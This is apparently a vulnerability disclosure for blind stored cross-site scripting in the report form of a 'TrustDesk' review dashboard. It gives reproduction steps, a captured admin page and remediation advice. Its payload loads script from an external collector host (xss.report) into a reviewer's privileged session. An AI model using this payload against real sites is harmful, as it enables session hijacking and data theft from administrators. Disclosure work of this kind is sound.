## Title

Blind Cross-Site Scripting (XSS) via Unsanitized Report Title and User/Email Fields on TrustDesk Review Queue Dashboard.

## Affected URL

https://trustdesk.pwnedbox.site/

## Description

A Blind Cross-Site Scripting (XSS) vulnerability was identified in the trust and safety report submission handler of the TrustDesk platform. User-supplied input submitted through report fields (such as Report title, Email, and Username) is stored persistently in the backend database without proper input sanitization, encoding, or output escaping.

When an administrative user or reviewer inspects submitted safety reports within the admin review console, the stored payloads—such as `<script src="https://xss.report/c/vansh"></script>`—are rendered directly into the Document Object Model (DOM). This causes the malicious script to execute asynchronously within the reviewer's privileged session context, allowing remote code execution, session hijacking, or administrative action compromise.

## Steps to Reproduce

1. Navigate to the target application submission interface: `https://trustdesk.pwnedbox.site/report.php`.
2. Locate the safety report form and inject JavaScript payloads into input fields (e.g., entering `'"&><script src="https://xss.report/c/vansh"></script>` into the Report title and email/profile fields).
3. Submit the trust and safety report form.
4. Log into the administrative review console where stored cases are evaluated (`https://trustdesk.pwnedbox.site/admin/` review queue).
5. Observe that the stored payload executes in the DOM of the review console, firing requests to the external collector (`xss.report`).

## POC
<img width="1407" height="1291" alt="image" src="https://github.com/user-attachments/assets/097dc02f-c38b-4112-99c7-de040c56c100" />
<img width="1718" height="1059" alt="image" src="https://github.com/user-attachments/assets/e609c025-20ec-4764-880d-a1c7dc3e111b" />

### Vulnerable DOM Snippet

```html
<html><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Case TD-5E3685DC · TrustDesk</title><link rel="stylesheet" href="../assets/style.css"></head><body class="admin-shell">
<header class="admin-top"><a class="brand" href="../index.php"><span class="shield">✦</span>TrustDesk</a><div><a href="index.php">← Queue</a><a href="logout.php">Sign out</a></div></header>
<main class="case-admin"><div class="case-admin-head"><div><span class="eyebrow">TD-5E3685DC</span><h1>'"&gt;<script src="https://xss.report/c/vansh"></script></h1></div><span class="status status-new">new</span></div>
<div class="admin-columns"><section class="case-card"><h3>Report details</h3><dl><dt>Type</dt><dd>Content</dd><dt>Severity</dt><dd>Medium</dd><dt>Reporter</dt><dd>'"&gt;&lt;ScriPt src=https://xss.report/c/vansh&gt;&lt;/ScriPt&gt;  · asd@gmail.com</dd><dt>Target</dt><dd>'"&gt;<script src="https://xss.report/c/vansh"></script>  · '"&gt;<script src="https://xss.report/c/vansh"></script></dd><dt>Submitted</dt><dd>2026-11-09 02:20:41</dd></dl><hr><h3>Description</h3><p>'"&gt;<script src="https://xss.report/c/vansh"></script></p><h3>Evidence / context</h3><p>'"&gt;<script src="https://xss.report/c/vansh"></script></p></section>
<aside><form class="case-card" action="update.php" method="post"><input type="hidden" name="csrf" value="a20efa2ff9ed832ea09ba1a1d6385476535d11e1fcfbe70bebd8ba0466f89d95"><input type="hidden" name="id" value="2"><h3>Case action</h3><label>Status<select name="status"><option selected="" value="new">New</option><option value="investigating">Investigating</option><option value="action_required">Action required</option><option value="resolved">Resolved</option><option value="closed">Closed</option></select></label><label>Severity<select name="severity"><option value="low">Low</option><option selected="" value="medium">Medium</option><option value="high">High</option><option value="critical">Critical</option></select></label><label>Customer-facing response<textarea name="admin_response" rows="6"></textarea></label><button class="button dark wide">Save case update</button></form>
<form class="case-card" action="update.php" method="post"><input type="hidden" name="csrf" value="a20efa2ff9ed832ea09ba1a1d6385476535d11e1fcfbe70bebd8ba0466f89d95"><input type="hidden" name="id" value="2"><input type="hidden" name="action" value="note"><h3>Internal note</h3><textarea name="note" rows="4" required="" placeholder="Only staff can see this note"></textarea><button class="button wide">Add note</button></form></aside></div>
<section class="history"><h3>Case activity</h3><div><span>•</span><p>Report submitted and added to the review queue<small>2026-11-09 02:20:41</small></p></div></section>
</main><script type="module" src="https://static.cloudflareinsights.com/beacon.min.js/vce701823e78c4301a35b7e07294d87301792088814092" integrity="sha512-UKNk8GbxkABxKcXYuLkO16EleLGUkcvJWtpSNmExE0Too3ZaFAxTscNWEc1OdAv5/BikHawapSCaiD2XCmp+Bw==" data-cf-beacon="{&quot;version&quot;:&quot;2024.11.0&quot;,&quot;token&quot;:&quot;534dbc1854e3437aa1164d09110b7f47&quot;,&quot;r&quot;:1,&quot;spa&quot;:2}" crossorigin="anonymous"></script>
<iframe class="html2canvas-container" style="visibility: hidden; position: fixed; left: -10000px; top: 0px; border: 0px;" width="1718" height="1059" scrolling="no" data-html2canvas-ignore="true"></iframe><iframe class="html2canvas-container" style="visibility: hidden; position: fixed; left: -10000px; top: 0px; border: 0px;" width="1718" height="1059" scrolling="no" data-html2canvas-ignore="true"></iframe><iframe class="html2canvas-container" style="visibility: hidden; position: fixed; left: -10000px; top: 0px; border: 0px;" width="1718" height="1059" scrolling="no" data-html2canvas-ignore="true"></iframe><iframe class="html2canvas-container" style="visibility: hidden; position: fixed; left: -10000px; top: 0px; border: 0px;" width="1718" height="1059" scrolling="no" data-html2canvas-ignore="true"></iframe></body></html>
```
## Impact
Execution of arbitrary JavaScript code within the high-privilege session of an administrator or safety reviewer examining submitted reports.

Compromise of administrative sessions, potential cookie or token exfiltration, and unauthorized modification of safety case statuses or moderation queues.

Persistent code execution affecting backend triage handlers and trust & safety review panels.

## Remediation
Implement strict context-aware output encoding (such as HTML entity encoding) for all stored user inputs when rendering them in review queues, dashboards, or detail views.

Apply strict input validation and sanitization policies on all report submission endpoints (Report title, Email, Username, Description fields) to reject or neutralize HTML markup and script tags.

Deploy a comprehensive Content Security Policy (CSP) restricting inline script execution and unauthorized external script domains.
</html>
